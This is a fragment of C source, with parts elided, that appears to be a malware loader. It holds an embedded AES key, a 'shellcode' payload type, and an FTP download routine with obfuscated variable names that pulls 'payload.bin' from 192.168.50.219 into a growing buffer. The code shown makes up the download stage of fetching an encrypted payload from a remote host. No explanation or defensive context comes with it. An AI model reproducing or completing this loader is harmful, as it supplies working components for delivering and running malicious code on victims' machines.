...
char key[] = "gXr2p9BvL6nQc1Zd";
char enc_algo[] = "aes";
char payload_type[] = "shellcode";
...
int DL() {
    ...
    while (InternetReadFile_(hFile, tempBuf, sizeof(tempBuf), &bytesRead) && bytesRead > 0) {
        if (DFgkSgvF + bytesRead > BGQZuhaw) {
            BGQZuhaw = (BGQZuhaw == 0) ? 8192 : BGQZuhaw * 2;
            zhvCaQcF = (unsigned char*)realloc(zhvCaQcF, BGQZuhaw);
            if (!zhvCaQcF) { InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
        }
        memcpy(zhvCaQcF + DFgkSgvF, tempBuf, bytesRead);
        DFgkSgvF += bytesRead;
    }
...
int main() {
    ...
    wcscpy(IP, L"192.168.50.219");
    PORT = 21;
    wcscpy(PATH, L"payload.bin");
